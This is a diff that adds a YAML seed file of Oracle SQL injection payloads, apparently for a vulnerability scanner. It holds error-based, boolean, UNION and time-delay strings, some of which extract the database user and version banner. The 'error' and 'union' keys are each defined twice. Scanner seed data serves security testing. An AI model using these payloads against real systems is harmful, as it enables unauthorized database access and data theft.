@@ -1,0 +1,53 @@
+# Oracle-specific SQLi payloads
+seeds:
+  sqli:
+    error:
+      - raw: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(97))-- "
+        dbms: "Oracle"
+        ctx: ["string"]
+      - raw: "1' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE rownum=1))-- "
+        dbms: "Oracle"
+        ctx: ["numeric"]
+      - raw: "'; SELECT 1 FROM dual-- "
+        dbms: "Oracle"
+        ctx: ["string"]
+    boolean_true:
+      - raw: "' AND 1=1 AND ROWNUM=1-- "
+        dbms: "Oracle"
+        ctx: ["string"]
+      - raw: "1 AND 1=1 AND ROWNUM=1-- "
+        dbms: "Oracle"
+        ctx: ["numeric"]
+    boolean_false:
+      - raw: "' AND 1=2 AND ROWNUM=1-- "
+        dbms: "Oracle"
+        ctx: ["string"]
+      - raw: "1 AND 1=2 AND ROWNUM=1-- "
+        dbms: "Oracle"
+        ctx: ["numeric"]
+    union:
+      - raw: "' UNION SELECT NULL FROM dual-- "
+        dbms: "Oracle"
+        ctx: ["string"]
+      - raw: "' UNION SELECT NULL,NULL FROM dual-- "
+        dbms: "Oracle"
+        ctx: ["string"]
+    error:
+      - raw: "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE rownum=1))-- "
+        dbms: "Oracle"
+        ctx: ["string"]
+      - raw: "1' AND 1=UTL_INADDR.GET_HOST_NAME('1.1.1.1')-- "
+        dbms: "Oracle"
+        ctx: ["numeric"]
+    time_oracle:
+      - raw: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- "
+        dbms: "Oracle"
+      - raw: "1' AND DBMS_LOCK.SLEEP(3)-- "
+        dbms: "Oracle"
+    union:
+      - raw: "' UNION SELECT user,2 FROM dual-- "
+        dbms: "Oracle"
+        ctx: ["string"]
+      - raw: "' UNION SELECT banner,2 FROM v$version WHERE rownum=1-- "
+        dbms: "Oracle"
+        ctx: ["string"]
